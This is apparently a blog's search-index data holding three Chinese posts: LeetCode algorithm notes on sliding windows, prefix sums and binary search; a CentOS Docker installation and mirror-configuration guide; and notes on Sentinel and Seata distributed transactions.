无重复字符的最长字串 1 2 3 4 5 6 7 1. 先模拟，右指针移动到发现重复字符时为边界 2. 边界处理：发现移动左指针时，无需将右指针移动回来（单调性），移动左指针即可 3. 注意：边界要分清楚！！right - left 的相对关系不能错 4. Counter(str) 方法，统计各个字符出现的次数 几乎唯一子数组的最大和 如果 nums 的一个子数组有至少 m 个互不相同的元素，我们称它是 几乎唯一 子数组。\n1 2 3 4 5 6 7 1. 区间求和，考虑用滑动窗口 2. 有两个变量 m,k 分别维护即可。用一个字典来标记是否有重复！ 3. 注意：当 defaultdict(int) 为空时，需要将元素删去！否则统计长度时会出错。 if cnt[out] == 0: del cnt[out] 不定长 + 越长越合法 每个字符最多出现两次 给你一个字符串 s ，请找出满足每个字符最多出现两次的最长子字符串，并返回该子字符串的 最大 长度。\n1 2 3 1. 区间判断，仍然是滑动窗口，不同之处在于变成了不定长滑窗 2. 不定长的判断逻辑修改一下即可 使数组平衡的最少移出数目 给你一个整数数组 nums 和一个整数 k。\n如果一个数组的 最大 元素的值 至多 是其 最小 元素的 k 倍，则该数组被称为是 平衡 的。\n你可以从 nums 中移除 任意 数量的元素，但不能使其变为 空 数组。\n返回为了使剩余数组平衡，需要移除的元素的 最小 数量。\n1 1. 能看出是滑动窗口吗？问题转化为：求一个窗口，使得其最小元素最小值*k \u0026gt;= 最大值！ 不定长 + 越短越合法 最短美丽字串 给二进制字符串s和正整数k，找到满足以下条件的子字符串：\n子字符串中1的个数恰好是k（即美丽子字符串）； 该子字符串是所有美丽子字符串中最短的； 若有多个最短的，选字典序最小的；若没有美丽子字符串，返回空字符串。 1 2 3 4 5 1. 如何保证最短？ --\u0026gt; 最前端如果有 0，需要继续向后 2. 当达到筛选条件后，需要进一步收缩边界！ 3. 字符串字典序直接比较即可 求子数组个数 + 越短越合法 元素乘积小于 k 的子数组数目 给你一个整数数组 nums 和一个整数 k ，请你返回子数组内所有元素的乘积严格小于 k 的连续子数组的数目。\n1 2 3 1. 要求连续子数组，发现缩短以后一样符合条件，所以是滑窗的变式 2. 小于当前窗口的都符合，所以要 res += right - left + 1 不间断子数组数目 给你一个下标从 0 开始的整数数组 nums 。nums 的一个子数组如果满足以下条件，那么它是 不间断 的：\ni，i + 1 ，\u0026hellip;，j 表示子数组中的下标。对于所有满足 i \u0026lt;= i1, i2 \u0026lt;= j 的下标对，都有 0 \u0026lt;= |nums[i1] - nums[i2]| \u0026lt;= 2 。 请你返回 不间断 子数组的总数目。\n子数组是一个数组中一段连续 非空 的元素序列。\n1 2 3 1. 用哈希表维护的判断条件！ 2. 还是滑窗的思路，依次控制窗口枚举 求子数组个数 + 越长越合法 包含所有三种字符的子字符串数目 给你一个字符串 s ，它只包含三种字符 a, b 和 c 。\n请你返回 a，b 和 c 都 至少 出现过一次的子字符串数目。\n1 2 3 4 5 1. 先找至少出现过一次的情况，想到滑动窗口 2. “至少”意味着只能找最短，所以在更新时要将更长的字符串加上，即 res += left 3. 注意：不能写 if len(cnt) \u0026lt; 3: continue 的判断，边界条件要考虑清楚！ 恰好型滑窗 要计算有多少个元素和恰好等于 k 的子数组，可以把问题变成：\n计算有多少个元素和 ≥k 的子数组。 计算有多少个元素和 \u0026gt;k，也就是 ≥k+1 的子数组。 因为滑动窗口比较难解决“等于”问题，故尝试转化成不等于问题，即越\u0026hellip;越合法\n答案就是元素和 ≥k 的子数组个数，减去元素和 ≥k+1 的子数组个数。\n也可以把问题变成 ≤k 减去 ≤k−1，即两个「至多」。可根据题目选择合适的变形方式。 和相同的二元子数组 给你一个二元数组 nums ，和一个整数 goal ，请你统计并返回有多少个和为 goal 的 非空 子数组。\n子数组 是数组的一段连续部分。\n1 2 3 1. 求区间和，可以用前缀和，但是这里考虑滑窗 2. 转为求 res1 - res2，需要用两个 left1，2、sum1，2 来分别求边界 前缀和 适用情景：\n连续子数组求和问题，数组不单调时，考虑用前缀和 任意子数组都是一个前缀去掉前缀后的结果。所以任意子数组的和，都可以表示为两个前缀和的差。 定义 s[0] = 0 ，提高适用性 初始化模板：\n1 2 3 s = [0] * (len(nums) + 1) for i, x in enumerate(nums): s[i + 1] = s[i] + x 例题 和为 K 的子数组 1 2 3 4 5 6 7 1. 连续数组求和，考虑前缀和 2. 继续分析，发现要求 s[i] + s[j] == k，暴力写法要 O(n^2)，考虑转换 3. 想到哈希表，空间换时间，遍历一遍后存储到表中，可以直接查询 s[j] - k 4. 注意：哈希表的遍历顺序和数组顺序要对应！先寻找，再加入哈希表，不能一次性往里添加 最大子数组和 1 2 3 4 5 1. 考虑前缀和 2. 发现边缘条件：需要考虑负数！前缀和求的是区间加法，所以要用当前前缀减去前面的最小前缀（需要维护） 3. 还可以用动态规划 二分 适用场景：\n有序数组找指定大小的数 思路：\n先确定区间（循环不变量），根据区间来初始化左右指针\n明确：左右指针以外是已经确定了大小关系的，接下来要更新的是左右指针以内的数\n转化\n基本做法只能做 \u0026gt;= x\n遇见 \u0026gt;x，转成 \u0026gt;= x+1，\u0026lt;x 转成 \u0026lt;= x-1 等等\n易错点\n要保证区间 - 条件判断的连贯性，判断条件只要符合区间，就合法，就需要查找 建议画图来理解！ 可以定义函数来复用逻辑 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def binary_search(nums, target): left = 0 right = len(nums) - 1 # 闭区间初始化 while left \u0026lt;= right: # 区间非空时循环 mid = (left + right) // 2 # 避免溢出可用 left + (right - left) // 2 if nums[mid] == target: return mid # 找到目标，返回索引 elif nums[mid] \u0026gt; target: right = mid - 1 # 目标在左半区间，收缩右边界 else: left = mid + 1 # 目标在右半区间，收缩左边界 return -1 # 区间为空，未找到 def find_first_ge(nums, target): left = 0 right = len(nums) - 1 res = len(nums) # 默认值（若所有元素都小于target，返回数组长度） while left \u0026lt;= right: mid = (left + right) // 2 if nums[mid] \u0026gt;= target: res = mid # 可能是候选答案，继续向左找更小的符合条件的位置 right = mid - 1 else: left = mid + 1 # 不符合，向右找 return res 二分查找 查找元素首尾位置 1 2 3 4 5 1. 边界的判断注意，函数 find 的是什么？结果要什么？ 2. 找到坐标后，如何排除不可能的答案？--\u0026gt; 直接用左右边界判断即可。 3. 还写错了 while 的更新条件，nums[mid] 而非 mid 搜索插入位置 1 1. 先想清楚要找什么！找第一个大于等于指定数的位置即可！ 寻找比目标字母大的最小字母 1 2 3 1. 写习惯了大于等于，怎么变成大于？ --\u0026gt; 改变循环不变量就可以！控制 left 左边为 \u0026lt;= 的就行 2. py 里求 askii 码：ord(char) 两个数组的距离值 给你两个整数数组 arr1 ， arr2 和一个整数 d ，请你返回两个数组之间的 距离值 。\n「距离值」 定义为符合此距离要求的元素数目：对于元素 arr1[i] ，不存在任何元素 arr2[j] 满足 |arr1[i]-arr2[j]| \u0026lt;= d 。\n1 2 3 4 5 1. 怎么找满足距离值的数？ --\u0026gt; 距离先变小后变大 --\u0026gt; 二分 2. 找什么数？ --\u0026gt; 大于等于 target 的第一个数和第一个数的前一个数，这两个数才有可能 3. 优化：二分查找 ≥x−d 的最小的数 y。如果 y 不存在，或者 y\u0026gt;x+d，那么说明 arr 没有在 [x−d,x+d] 中的数，答案加一。 区间内查询数字的频率 请你实现 RangeFreqQuery 类：\nRangeFreqQuery(int[] arr) 用下标从 0 开始的整数数组 arr 构造一个类的实例。 int query(int left, int right, int value) 返回子数组 arr[left...right] 中 value 的 频率 。 1 2 3 1. 暴力会超时……考虑优化 2. 找数字在区间内出现的频率，把问题化约到每个数字，先记录每个数字出现的下标表，然后二分查找在所求区间内，数字的数量。 二分答案 定义：一种通过 “二分枚举可能的答案范围” 来求解优化问题（如最大值最小化、最小值最大化）的算法。 核心目标：在所有可能的答案中，找到满足题目约束条件的最优解（如最大、最小、符合条件的解）。 本质：“构造答案并验证”，将优化问题转化为 “判断某个值是否为可行解” 的判定问题，再通过二分缩小范围。 简而言之，就是不确定上下界，需要自己放缩出边界，然后进行二分查找。可能需要自己编写 check 函数来判断\n模板：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution: # 计算满足 check(x) == True 的最小整数 x def binarySearchMin(self, nums: List[int]) -\u0026gt; int: # 二分猜答案：判断 mid 是否满足题目要求 def check(mid: int) -\u0026gt; bool: # TODO left = # 循环不变量：check(left) 恒为 False right = # 循环不变量：check(right) 恒为 True while left + 1 \u0026lt; right: # 开区间不为空 mid = (left + right) // 2 if check(mid): # 说明 check(\u0026gt;= mid 的数) 均为 True right = mid # 接下来在 (left, mid) 中二分答案 else: # 说明 check(\u0026lt;= mid 的数) 均为 False left = mid # 接下来在 (mid, right) 中二分答案 # 循环结束后 left+1 = right # 此时 check(left) == False 而 check(left+1) == check(right) == True # 所以 right 就是最小的满足 check 的值 return right 使结果不超过阈值的最小除数 给你一个整数数组 nums 和一个正整数 threshold ，你需要选择一个正整数作为除数，然后将数组里每个数都除以它，并对除法结果求和。\n请你找出能够使上述结果小于等于阈值 threshold 的除数中 最小 的那个。\n每个数除以除数后都向上取整，比方说 7/3 = 3 ， 10/2 = 5 。\n题目保证一定有解。\n1 2 3 4 5 1. 找值，考虑二分 2. 先确定上下边界，可以取 1,max(nums),然后自定义 check 函数判断。 3. python 的向上取整函数 math.ceil() 在 D 天内送达包裹的能力 传送带上的包裹必须在 days 天内从一个港口运送到另一个港口。\n传送带上的第 i 个包裹的重量为 weights[i]。每一天，我们都会按给出重量（weights）的顺序往传送带上装载包裹。我们装载的重量不会超过船的最大运载重量。\n返回能在 days 天内将传送带上的所有包裹送达的船的最低运载能力。\n1 2 3 4 5 6 7 8 9 10 11 12 13 1. 难点在 check 函数的编写！怎么判断是否可以？ 2. 其实很简单，注意初始 cnt = 1，每天的货物运输需要模拟过程才不会错！ def helper(load): days = 1 # 最少也得花一天 s = 0 for x in weights: s += x if s \u0026gt; load: days += 1 s = x # 当前包开始新一天 return days ","date":"2025-09-30T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251017094519413.png","permalink":"https://calendar0917.github.io/posts/leetcode/","title":"LeetCode Hot100"},{"content":"查看是否已安装 1 docker --version 若已安装：\n1 2 3 4 5 6 7 8 9 10 11 yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine \\ docker-ce 安装依赖工具 yum 1 sudo yum install -y yum-utils device-mapper-persistent-data lvm2 错误：yum-config-manager：找不到命令\nyum -y install yum-utils\n错误：更新 yum 报错\nsudo tee /etc/yum.repos.d/CentOS-Base.repo \u0026laquo;-\u0026lsquo;EOF\u0026rsquo; [base] name=CentOS-$releasever - Base baseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[updates] name=CentOS-$releasever - Updates baseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n[extras] name=CentOS-$releasever - Extras baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/ gpgcheck=1 gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\nEOF\n安装docker 添加 docker 官方仓库\n1 2 3 4 sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # 阿里云： sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 安装\n1 sudo yum install -y docker-ce docker-ce-cli containerd.io 启动、设置开机自启\n1 2 sudo systemctl start docker sudo systemctl enable docker docker 拉取镜像源配置 添加多个镜像源\n1 2 3 4 5 6 7 8 9 10 11 12 sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://alzgoonw.mirror.aliyuncs.com\u0026#34;, \u0026#34;https://docker.m.daocloud.io\u0026#34;, \u0026#34;https://dockerhub.icu\u0026#34;, \u0026#34;https://docker.anyhub.us.kg\u0026#34;, \u0026#34;https://docker.1panel.live\u0026#34; ] } EOF 重新加载并重启\n1 2 sudo systemctl daemon-reload sudo systemctl restart docker 测试\n1 docker pull hello-world ","date":"2025-09-29T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E9%85%8D%E7%BD%AEdocker/","title":"配置docker"},{"content":"微服务保护 问题：\n雪崩问题：某个服务故障，导致整个链路失效 微服务相互调用 没有做好异常处理 所有服务级联失败 解决思路：\n尽量避免服务故障、阻塞\n做好异常的后备方案\n方案：\n请求限流 线程隔离：控制业务可用线程数量 服务熔断：将异常比例过高的接口断开，直接走 fallback 失败处理：定义 fallback 处理逻辑 Sentinel 整合到微服务中，配置控制台\n簇点链路：默认情况下，Sentinel 拦截的只是 Controller 的请求路径，故需要配置其拦截请求方法。\n请求限流 设置 QPS，每秒最多请求线程数\nJmeter\n请求模拟工具，用于测试压力\n线程隔离 服务 B 出现阻塞或故障时，调用服务 B 的服务 A 的资源也可能因此被耗尽，故必须限制服务 A 中调用服务B的线程数。保护服务 A 中其他接口。\nFallback 将 FeignClient 添加到服务，若超限，则调用其中的 FallFactory 的接口。\n服务熔断 解决雪崩问题的重要手段。有断路器统计服务调用的异常比例、慢请求比例，若超出阈值则熔断改服务。\n分布式事务 分布式系统中，一个业务需要多个服务共同完成，则这多个服务需要同时成功或失败。\n解决思路：\n各个子事务之间能感知到彼此的状态 Seata Seata架构 TC：事务协调者，协调全局事务提交或回滚\nTM：事务管理器，定义全局事务的范围，开始提交或回滚（入口）\nRM：资源管理器，与 TC 交谈以注册事务状态\n部署 TC 服务 seata 用 docker 部署，然后注册到 Nacos 上\n微服务集成 Seata 在 application.yml 中添加配置，让微服务找到 TC 地址\n抽取共享配置到 nacos、划分事务组\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 seata: registry: # TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址 type: nacos # 注册中心类型 nacos nacos: server-addr: 192.168.150.101:8848 # nacos地址 namespace: \u0026#34;\u0026#34; # namespace，默认为空 group: DEFAULT_GROUP # 分组，默认是DEFAULT_GROUP application: seata-server # seata服务名称 username: nacos password: nacos tx-service-group: hmall # 事务组名称 service: vgroup-mapping: # 事务组与tc集群的映射关系 hmall: \u0026#34;default\u0026#34; XA 模式 步骤：\nRM 注册分支事务到 TC RM 执行 sql 但不提交 RM 报告执行状态到 TC TC 检查各分支执行状态，RM 等待 TC 指令 问题：\n需要锁定数据库资源，需要等待，性能较差 AT 模式 弥补 XA 模式中资源锁定周期过长的缺陷\n步骤：\n注册分支事务 记录数据快照 执行 sql 并提交 报告事务状态 删除快照 / 根据快照恢复数据 问题：\n短暂的数据不一致 使用：\n对每个服务创建一个 undo_log 表 ","date":"2025-09-08T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/","title":"微服务保护及分布式事务"}]